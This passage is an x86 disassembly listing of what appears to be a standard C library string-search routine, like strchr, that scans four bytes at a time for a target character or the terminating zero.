  428c99:	xor    ecx,0xffffffff
  428c9c:	xor    eax,0xffffffff
  428c9f:	xor    ecx,edi
  428ca1:	xor    eax,esi
  428ca3:	add    edx,0x4
  428ca6:	and    ecx,0x81010100
  428cac:	jne    0x428cca
  428cae:	and    eax,0x81010100
  428cb3:	je     0x428c88
  428cb5:	and    eax,0x1010100
  428cba:	jne    0x428cc4
  428cbc:	and    esi,0x80000000
  428cc2:	jne    0x428c88
  428cc4:	pop    esi
  428cc5:	pop    edi
  428cc6:	pop    ebx
  428cc7:	xor    eax,eax
  428cc9:	ret    
  428cca:	mov    eax,DWORD PTR [edx-0x4]
  428ccd:	cmp    al,bl
  428ccf:	je     0x428d07
  428cd1:	test   al,al
  428cd3:	je     0x428cc4
  428cd5:	cmp    ah,bl
  428cd7:	je     0x428d00
  428cd9:	test   ah,ah
  428cdb:	je     0x428cc4
  428cdd:	shr    eax,0x10
  428ce0:	cmp    al,bl
  428ce2:	je     0x428cf9
  428ce4:	test   al,al
  428ce6:	je     0x428cc4
  428ce8:	cmp    ah,bl
  428cea:	je     0x428cf2
  428cec:	test   ah,ah
  428cee:	je     0x428cc4
  428cf0:	jmp    0x428c88
  428cf2:	pop    esi
  428cf3:	pop    edi
  428cf4:	lea    eax,[edx-0x1]
  428cf7:	pop    ebx
  428cf8:	ret    
  428cf9:	lea    eax,[edx-0x2]
  428cfc:	pop    esi
  428cfd:	pop    edi
  428cfe:	pop    ebx
  428cff:	ret    
  428d00:	lea    eax,[edx-0x3]
  428d03:	pop    esi
  428d04:	pop    edi
  428d05:	pop    ebx
  428d06:	ret    
  428d07:	lea    eax,[edx-0x4]
  428d0a:	pop    esi
  428d0b:	pop    edi
  428d0c:	pop    ebx
  428d0d:	ret    
  428d0e:	jmp    DWORD PTR ds:0x429070
